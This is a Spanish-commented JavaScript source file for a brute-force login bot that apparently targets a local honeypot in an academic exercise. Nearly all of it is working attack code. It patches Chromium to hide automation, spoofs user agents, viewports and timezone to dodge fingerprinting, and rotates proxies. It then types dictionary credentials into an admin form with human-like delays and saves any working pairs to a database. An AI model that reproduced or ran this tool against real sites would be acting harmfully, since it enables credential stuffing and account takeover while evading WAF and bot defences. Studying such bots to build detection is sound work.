/**
 * @file bot_evasion.js
 * @brief Bot de Ataque de Fuerza Bruta con Evasión Avanzada (Stealth & Proxy).
 * @details Este módulo implementa un motor de ataque distribuido usando Playwright. 
 * Su diseño académico se centra en la simulación de comportamiento humano y la 
 * manipulación de huellas digitales (Fingerprinting) para evadir sistemas WAF y Honeypots.
 * 
 * Características Elite:
 * - Parcheado de motor V8 (Stealth): Oculta atributos 'navigator.webdriver'.
 * - Ofuscación de Canvas: Modifica el viewport para alterar hashes de renderizado.
 * - Rotación de Proxy: Enrutamiento de capa 3 por instancia de bot.
 * 
 * @author Felipe Andrés
 * @version 2.1.1
 */

'use strict';

require('dotenv').config();

const { chromium } = require('playwright-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const mysql = require('mysql2/promise');

// Activación del plugin Stealth para parchear Chromium nativamente.
chromium.use(StealthPlugin());

/**
 * @brief Registra credenciales vulneradas en la base de datos de infiltración.
 * @details Este método se dispara únicamente cuando un bot logra superar el desafío
 * de login del Honeypot, guardando la identidad del bot y el proxy que tuvo éxito.
 * @async
 * @param {string} usuario Usuario detectado como válido.
 * @param {string} password Contraseña detectada como válida.
 * @param {string} identity Metadatos del bot (UA, Resolución, Proxy).
 * @return {Promise<void>}
 */
async function registrarExito(usuario, password, identity) {
    try {
        const connection = await mysql.createConnection({
            host:     process.env.DB_HOST     || 'localhost',
            port:     process.env.DB_PORT     || 3306,
            user:     process.env.DB_USER     || 'root',
            password: process.env.DB_PASSWORD || '',
            database: process.env.DB_NAME     || 'bots_infiltradores'
        });
        await connection.execute(
            'INSERT INTO exitos_bots (usuario, password, identity_used, fecha) VALUES (?, ?, ?, NOW())',
            [usuario, password, identity]
        );
        await connection.end();
    } catch (e) {
        console.error('[DB ERROR] Fallo en persistencia de infiltración:', e.message);
    }
}

/**
 * @brief Ejecuta un ciclo de ataque completo para un segmento de diccionario.
 * @details Orquesta la vida de un bot desde el lanzamiento del navegador con identidad suplantada
 * hasta la inyección de credenciales. Implementa delays humanos y manejo de proxies.
 * @async
 * @param {string} idAtacante Nombre lógico del bot.
 * @param {string} userAgent Cadena de identificación de navegador a suplantar.
 * @param {number} ancho Ancho del viewport (afecta al Canvas Fingerprint).
 * @param {number} alto Alto del viewport.
 * @param {Array} credenciales Diccionario segmentado de usuarios/passwords.
 * @param {string} proxy Servidor de salida en formato 'protocolo://ip:puerto'.
 * @return {Promise<void>}
 */
async function ejecutarCiclo(idAtacante, userAgent, ancho, alto, credenciales, proxy) {

    console.log(`[BOT] Desplegando ${idAtacante} | Capa Proxy: ${proxy || 'Transparente'}`);

    // Configuración de argumentos de lanzamiento para Chromium.
    const browserArgs = ['--no-sandbox', '--disable-setuid-sandbox'];
    if (proxy) browserArgs.push(`--proxy-server=${proxy}`);

    const browser = await chromium.launch({
        headless: true, // Modo sigiloso (sin interfaz gráfica)
        args: browserArgs
    });

    /**
     * @brief Contexto de navegación aislado.
     * @details Simula un entorno de usuario real, incluyendo Locale y Timezone coherentes.
     */
    const context = await browser.newContext({
        userAgent: userAgent,
        viewport: { width: ancho, height: alto },
        locale: 'es-ES',
        timezoneId: 'Europe/Madrid'
    });

    const page = await context.newPage();
    const rootUrl  = 'http://localhost:8080/LoginWeb/index.html';
    const adminUrl = 'http://localhost:8080/LoginWeb/admin.html';

    // FASE 1: Superación de barreras de consentimiento
    try {
        await page.goto(rootUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
        await page.check('#check-consent', { timeout: 10000 }).catch(() => {});
        await page.click('button.btn-primary', { timeout: 10000 }).catch(() => {});
        await page.waitForURL('**/admin.html', { timeout: 15000 }).catch(() => {});
    } catch (e) {
        console.log(`[BOT] ${idAtacante} Error en Fase 1 (Consentimiento): ${e.message}`);
    }

    /**
     * @brief Ciclo de Fuerza Bruta.
     * @details Itera sobre el segmento de diccionario asignado, inyectando datos
     * con tiempos de escritura que emulan el comportamiento humano (Typing Delay).
     */
    for (const cred of credenciales) {
        try {
            await page.goto(adminUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
            await page.waitForSelector('input[name="usuario"]', { timeout: 30000 });

            // Inyección de credenciales con delay humano de 50ms por tecla
            await page.locator('input[name="usuario"]').type(cred.u, { delay: 50 });
            await page.locator('input[name="password"]').type(cred.p, { delay: 50 });

            // Ejecución del submit y espera de respuesta de red
            await Promise.all([
                page.click('button[type="submit"]'),
                page.waitForNavigation({ waitUntil: 'networkidle', timeout: 10000 }).catch(() => {})
            ]);

            // Detección de Infiltración Exitosa
            if (page.url().includes('portal_admin_dashboard.html')) {
                console.log(`[🏆 ÉXITO] Infiltración confirmada: ${cred.u}:${cred.p}`);
                await registrarExito(cred.u, cred.p, `${idAtacante} | UA:${userAgent} | Proxy:${proxy}`);
                break;
            }
        } catch (e) {
            console.log(`[BOT] ${idAtacante} Fallo en intento ${cred.u}: ${e.message.split('\n')[0]}`);
        }
    }

    await browser.close();
    console.log(`[BOT] Segmento ${idAtacante} completado.`);
}

// Punto de Entrada: Procesamiento de argumentos JSON desde el lanzador masivo
const args = process.argv.slice(2);
if (args.length > 0) {
    try {
        const config = JSON.parse(args[0]);
        ejecutarCiclo(config.id, config.ua, config.w, config.h, config.creds, config.proxy || null);
    } catch (e) {
        console.error('[ERROR] Configuración JSON corrupta:', e.message);
    }
} else {
    console.error('[ERROR] Se requiere configuración JSON para el bot.');
}
